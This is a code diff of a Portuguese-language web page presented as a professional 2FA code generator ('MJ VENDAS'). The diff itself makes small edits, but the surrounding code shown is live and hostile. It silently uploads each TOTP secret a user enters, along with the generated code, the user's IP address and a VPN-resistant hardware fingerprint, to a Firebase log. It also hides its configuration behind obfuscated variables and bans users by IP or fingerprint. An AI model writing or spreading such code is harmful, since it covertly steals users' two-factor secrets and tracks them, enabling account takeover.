@@ -2,6 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MJ VENDAS • Gerador 2FA Profissional</title>
     <link href="https://fonts.gstatic.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
@@ -34,7 +35,6 @@
         .item2fa input { margin-top: 5px; padding: 8px; background: #1a1a1a; font-size: 12px; }
         .codigoMini { font-size: 24px; font-weight: 700; color: #4cd964; margin-top: 5px; letter-spacing: 2px; cursor: pointer; text-align: center; }
 
-        /* ESTILO TELA DE BANIMENTO (FOTO QUE VOCE MANDOU) */
         .ban-screen { text-align: center; background: #000; width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; position: fixed; top: 0; left: 0; z-index: 9999; }
         .ban-title { color: #ff0000; font-size: 38px; font-weight: 800; margin: 20px 0; display: flex; align-items: center; gap: 10px; }
         .ban-msg { color: #e8e8e8; font-size: 16px; margin-bottom: 40px; }
@@ -110,7 +110,6 @@ var firebaseConfig = { apiKey: _0x5a1e[1], databaseURL: _0x5a1e[3] };
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
-// GERAÇÃO DE HARDWARE ID (FINGERPRINT) - MESMO COM VPN ISSO FICA SALVO
 function getHardwareID() {
     let id = localStorage.getItem('mj_hwid');
     if(!id) {
@@ -129,16 +128,12 @@ fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
     checkBan(); 
 });
 
-// SISTEMA DE VERIFICAÇÃO DE BANIMENTO (IP + ID)
 function checkBan() {
-    // Procura na LISTA_NEGRA se o IP ou o ID do hardware estão banidos
-    db.ref("LISTA_NEGRA").once('value', snapshot => {
+    db.ref("LISTA_NEGRA").on('value', snapshot => {
         let banido = false;
         snapshot.forEach(item => {
             let b = item.val();
-            if(b.ip === rawIP || b.hwid === hwID) {
-                banido = true;
-            }
+            if(b.ip === rawIP || b.hwid === hwID) { banido = true; }
         });
 
         if(banido) {
@@ -157,7 +152,6 @@ function checkBan() {
     });
 }
 
-// LOGICA 2FA
 function b32(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
 function gOTP(s){try{let k=b32(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
 function copiar(t){if(!t||t==="------")return;navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Copiado!";setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
@@ -166,7 +160,6 @@ function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.st
 function togglePainel(){document.getElementById("painel").style.display="block"}
 function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-// VOTACAO
 const q=['p1','p2','p3'];
 q.forEach(p=>{
     db.ref('avaliacoes/'+p+'/sim').on('value',s=>{if(document.getElementById(p+'_sim'))document.getElementById(p+'_sim').innerText='👍 Sim ('+(s.val()||0)+')'});
@@ -178,7 +171,6 @@ function votar(p,t){
     localStorage.setItem('voto_'+p,t);
 }
 
-// MONITORAMENTO (LOGS E ESTOQUE)
 document.getElementById("secret").addEventListener("input", function(){
     let v = this.value.trim().toUpperCase();
     let d = new Date().toISOString().split('T')[0];
@@ -190,8 +182,6 @@ document.getElementById("secret").addEventListener("input", function(){
             let o = gOTP(v);
             document.getElementById("code").innerText = o;
             document.getElementById("clearInput").style.display = "block";
-            
-            // LOGS 2FA COM PUSH (HISTORICO)
             db.ref("LOGS_2FA/" + d + "/" + userIP).push({ chave: v, codigo_gerado: o, hora: h, ip_cliente: rawIP, hwid: hwID });
 
             db.ref(_0x5a1e[6] + v).once('value').then(s => {
